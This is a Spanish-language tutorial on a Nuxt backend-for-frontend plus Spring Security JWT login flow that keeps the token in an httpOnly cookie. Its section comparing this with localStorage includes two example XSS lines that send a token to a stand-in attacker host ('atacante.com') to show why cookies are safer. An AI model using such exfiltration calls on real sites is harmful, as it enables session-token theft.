# Flujo de Autenticación: Nuxt BFF + Spring Security

## Arquitectura

```
┌─────────────────────────────────────────────────────────────────┐
│ Frontend (Nuxt + Vue 3)                    localhost:3000       │
│ - pages/api-demo.vue                                            │
│ - $fetch('/api/auth/login')                                     │
│ - JavaScript NO ve el token (httpOnly cookie)                   │
└────────────────────────────┬──────────────────────────────────────┘
                             │
                    (sin CORS, mismo origen)
                             │
┌────────────────────────────▼──────────────────────────────────────┐
│ BFF (Nuxt Server)                          localhost:3000        │
│ - server/api/auth/login.ts                                       │
│ - server/api/tasks.ts                                            │
│ - Guarda token en httpOnly cookie                                │
│ - Envía token a Java en Authorization header                     │
└────────────────────────────┬──────────────────────────────────────┘
                             │
                    (HTTP interno, servidor a servidor)
                             │
┌────────────────────────────▼──────────────────────────────────────┐
│ Java/Spring Backend                        localhost:8080        │
│ - Spring Security                                                │
│ - JwtAuthenticationFilter                                        │
│ - @PreAuthorize("isAuthenticated()")                             │
│ - Valida JWT                                                     │
└────────────────────────────┬──────────────────────────────────────┘
                             │
┌────────────────────────────▼──────────────────────────────────────┐
│ Database                                                         │
│ - Usuarios                                                       │
│ - Tareas                                                         │
└──────────────────────────────────────────────────────────────────┘
```

## Paso a Paso: Login

### Paso 1: Frontend envía credenciales

**Archivo: `app/pages/api-demo.vue`**

```ts
const login = async () => {
  loginResponse.value = await $fetch('/api/auth/login', {
    method: 'POST',
    body: { 
      email: email.value, 
      password: password.value 
    }
  })
}
```

**Request HTTP:**
```
POST /api/auth/login HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{
  "email": "user@example.com",
  "password": "password123"
}
```

### Paso 2: BFF consulta Java backend

**Archivo: `app/server/api/auth/login.ts`**

```ts
import { API_ENDPOINTS } from '../../utils/backend'

export default defineEventHandler(async (event) => {
  const { email, password } = await readBody(event)

  try {
    // 1. BFF consulta Java backend
    const response = await fetch(API_ENDPOINTS.login, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password })
    })

    if (!response.ok) {
      throw createError({
        statusCode: response.status,
        statusMessage: 'Credenciales inválidas'
      })
    }

    // 2. Recibe token JWT de Java
    const backendResponse = await response.json()
    const token = backendResponse.token

    // 3. Guarda token en httpOnly cookie (SEGURO)
    setCookie(event, 'auth_token', token, {
      httpOnly: true,      // ← JavaScript NO puede acceder
      secure: true,        // ← Solo HTTPS en producción
      sameSite: 'strict',  // ← CSRF protection
      maxAge: 60 * 60 * 24 * 7  // ← 7 días
    })

    return {
      success: true,
      user: backendResponse.user,
      message: 'Login exitoso'
    }
  } catch (error: any) {
    console.error('[BFF] Error login:', error.message)
    throw createError({
      statusCode: 401,
      statusMessage: 'Error de autenticación'
    })
  }
})
```

**Request del BFF a Java:**
```
POST http://localhost:8080/api/auth/login HTTP/1.1
Content-Type: application/json

{
  "email": "user@example.com",
  "password": "password123"
}
```

### Paso 3: Java/Spring autentica

**Archivo: `java/SecurityConfig.java` (Backend Java)**

```java
@PostMapping("/api/auth/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
  try {
    // Spring Security autentica
    Authentication auth = authenticationManager.authenticate(
      new UsernamePasswordAuthenticationToken(
        request.getEmail(),
        request.getPassword()
      )
    );

    // Genera JWT
    String token = jwtTokenProvider.generateToken(auth);
    
    return ResponseEntity.ok(new LoginResponse(token, userDetails));
  } catch (BadCredentialsException e) {
    return ResponseEntity.status(401).body(new ErrorResponse("Credenciales inválidas"));
  }
}
```

**Response de Java a BFF:**
```json
{
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
  "user": {
    "id": "123",
    "email": "user@example.com",
    "name": "John Doe"
  }
}
```

### Paso 4: BFF responde al frontend

**Response del BFF al Frontend:**
```json
{
  "success": true,
  "user": {
    "id": "123",
    "email": "user@example.com",
    "name": "John Doe"
  },
  "message": "Login exitoso"
}
```

**Cookie guardada (invisible para JavaScript):**
```
Set-Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...; HttpOnly; Secure; SameSite=Strict; Max-Age=604800
```

---

## Paso a Paso: Request autenticado (GET /api/tasks)

### Paso 1: Frontend pide tareas

**Archivo: `app/pages/api-demo.vue`**

```ts
const fetchTasks = async () => {
  // Cookie se envía automáticamente (no hay código para enviarlo)
  tasks.value = await $fetch('/api/tasks')
}
```

**Request HTTP (automático):**
```
GET /api/tasks HTTP/1.1
Host: localhost:3000
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

⚠️ **Nota**: El navegador envía la cookie automáticamente, JavaScript NO la ve.

### Paso 2: BFF extrae token y consulta Java

**Archivo: `app/server/api/tasks.ts`**

```ts
import { API_ENDPOINTS } from '../utils/backend'

export default defineEventHandler(async (event) => {
  try {
    // 1. Extrae token de cookie (automáticamente en headers)
    const token = getCookie(event, 'auth_token')

    if (!token) {
      throw createError({
        statusCode: 401,
        statusMessage: 'No autenticado'
      })
    }

    // 2. BFF consulta Java backend CON token
    const response = await fetch(API_ENDPOINTS.tasks, {
      headers: {
        'Authorization': `Bearer ${token}`  // ← Envía token a Java
      }
    })

    if (!response.ok) {
      throw createError({
        statusCode: response.status,
        statusMessage: 'Error consultando tareas'
      })
    }

    // 3. Transforma datos si es necesario
    const backendTasks = await response.json()

    return {
      success: true,
      data: backendTasks.map(task => ({
        id: task.id,
        title: task.title,
        completed: task.isDone,  // ← Renombra si Java usa otro nombre
        createdAt: task.createdDate
      })),
      count: backendTasks.length
    }
  } catch (error: any) {
    console.error('[BFF] Error en GET /api/tasks:', error.message)
    throw createError({
      statusCode: 401,
      statusMessage: 'Error de autenticación o acceso'
    })
  }
})
```

**Request del BFF a Java:**
```
GET http://localhost:8080/api/tasks HTTP/1.1
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
```

### Paso 3: Java/Spring valida JWT

**Archivo: `java/JwtAuthenticationFilter.java` (Backend Java)**

```java
public class JwtAuthenticationFilter extends OncePerRequestFilter {
  
  @Override
  protected void doFilterInternal(HttpServletRequest request, 
                                 HttpServletResponse response, 
                                 FilterChain chain) throws ServletException, IOException {
    
    try {
      // 1. Extrae token del header Authorization
      String token = extractTokenFromHeader(request);
      
      if (token != null && jwtTokenProvider.validateToken(token)) {
        // 2. Valida JWT (firma, expiración, etc)
        String email = jwtTokenProvider.getEmailFromToken(token);
        UserDetails userDetails = userDetailsService.loadUserByUsername(email);
        
        // 3. Crea Authentication con el usuario
        Authentication auth = new UsernamePasswordAuthenticationToken(
          userDetails, null, userDetails.getAuthorities()
        );
        
        // 4. Guarda en SecurityContext (disponible en controller)
        SecurityContextHolder.getContext().setAuthentication(auth);
      }
    } catch (JwtException e) {
      response.setStatus(HttpServletResponse.SC_UNAUTHORIZED);
      return;
    }
    
    chain.doFilter(request, response);
  }
}
```

**Endpoint protegido:**
```java
@GetMapping("/api/tasks")
@PreAuthorize("isAuthenticated()")  // ← Requiere autenticación
public ResponseEntity<?> getTasks(Authentication authentication) {
  // authentication = usuario logeado (del JWT)
  User user = (User) authentication.getPrincipal();
  
  List<Task> tasks = taskService.getTasksByUser(user.getId());
  return ResponseEntity.ok(tasks);
}
```

### Paso 4: BFF responde al frontend

**Response:**
```json
{
  "success": true,
  "data": [
    { "id": "1", "title": "Tarea 1", "completed": true, "createdAt": "2026-01-01T10:00:00Z" },
    { "id": "2", "title": "Tarea 2", "completed": false, "createdAt": "2026-01-02T10:00:00Z" }
  ],
  "count": 2
}
```

---

## Logout

### Paso 1: Frontend llama logout

**Archivo: `app/pages/api-demo.vue`**

```ts
const logout = async () => {
  await $fetch('/api/auth/logout', { method: 'POST' })
}
```

### Paso 2: BFF elimina cookie

**Archivo: `app/server/api/auth/logout.ts`**

```ts
export default defineEventHandler(async (event) => {
  // Elimina cookie (expira inmediatamente)
  deleteCookie(event, 'auth_token')
  
  return { success: true, message: 'Logout exitoso' }
})
```

**Response:**
```
Set-Cookie: auth_token=; expires=Thu, 01 Jan 1970 00:00:00 GMT; Max-Age=0
```

---

## Seguridad: httpOnly Cookie vs localStorage

### ❌ VULNERABLE: Token en localStorage

```ts
// Frontend (INSEGURO)
localStorage.setItem('token', response.token)

// JavaScript accede (problema)
console.log(localStorage.getItem('token'))  // ✅ Funciona

// Si hay XSS (inyección de código malicioso):
fetch('http://atacante.com/robar?token=' + localStorage.getItem('token'))
// ✅ Token robado
```

### ✅ SEGURO: Token en httpOnly cookie

```ts
// BFF (SEGURO)
setCookie(event, 'auth_token', token, { httpOnly: true })

// JavaScript NO accede
console.log(document.cookie)  // auth_token NO aparece

// Incluso con XSS:
fetch('http://atacante.com/robar?token=' + document.cookie)
// ❌ No hay nada para robar
```

---

## En DevTools (Navegador)

### Qué ves

**Application → Cookies:**
```
Name: auth_token
Value: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...
HttpOnly: ✓ (marcado)
Secure: ✓ (marcado)
SameSite: Strict
```

### Qué NO ves

**Console (JavaScript):**
```ts
document.cookie
// Output: "" (vacío, auth_token NO aparece)

localStorage.getItem('auth_token')
// Output: null (no existe)
```

---

## Flujo completo en diagrama

```
1. LOGIN
   Frontend: $fetch('/api/auth/login', { email, password })
      ↓
   BFF: fetch('http://localhost:8080/api/auth/login', { email, password })
      ↓
   Java: authenticationManager.authenticate() → genera JWT
      ↓
   BFF: setCookie('auth_token', jwt, { httpOnly: true })
      ↓
   Frontend: recibe respuesta (NO ve el token)

2. REQUEST AUTENTICADO
   Frontend: $fetch('/api/tasks')
      + Cookie: auth_token=jwt (automático)
      ↓
   BFF: getCookie('auth_token') → fetch('http://localhost:8080/api/tasks', {
      Authorization: Bearer jwt
   })
      ↓
   Java: JwtAuthenticationFilter valida JWT
      + Si válido: executa endpoint
      + Si inválido: 401 Unauthorized
      ↓
   Frontend: recibe datos

3. LOGOUT
   Frontend: $fetch('/api/auth/logout', { POST })
      ↓
   BFF: deleteCookie('auth_token')
      ↓
   Cookie eliminada, siguiente request sin autenticación → 401
```

---

## Configuración

### `.env`
```
JAVA_BACKEND_URL=http://localhost:8080
```

### `server/utils/backend.ts`
```ts
export const JAVA_BACKEND_URL = process.env.JAVA_BACKEND_URL || 'http://localhost:8080'

export const API_ENDPOINTS = {
  login: `${JAVA_BACKEND_URL}/api/auth/login`,
  tasks: `${JAVA_BACKEND_URL}/api/tasks`,
}
```

### `nuxt.config.ts`
```ts
export default defineNuxtConfig({
  runtimeConfig: {
    javaBackendUrl: process.env.JAVA_BACKEND_URL || 'http://localhost:8080'
  }
})
```

---

## Variables importantes

| Variable | Ubicación | Descripción |
|----------|-----------|-------------|
| `auth_token` | httpOnly Cookie (BFF) | JWT token (NO accesible por JavaScript) |
| `token` | Java Response | JWT generado por Spring Security |
| `Authorization` header | BFF → Java | Header con token en formato `Bearer <jwt>` |
| `SecurityContext` | Java | Contexto con usuario autenticado |

---

## Resumen

✅ **Frontend** → $fetch (sin código, cookie automática)
✅ **BFF** → Guarda token en httpOnly cookie
✅ **BFF** → Envía token a Java en Authorization header
✅ **Java** → Spring Security valida JWT
✅ **Seguridad** → Token NO visible en JavaScript (httpOnly)
✅ **CSRF** → Protected con SameSite=Strict
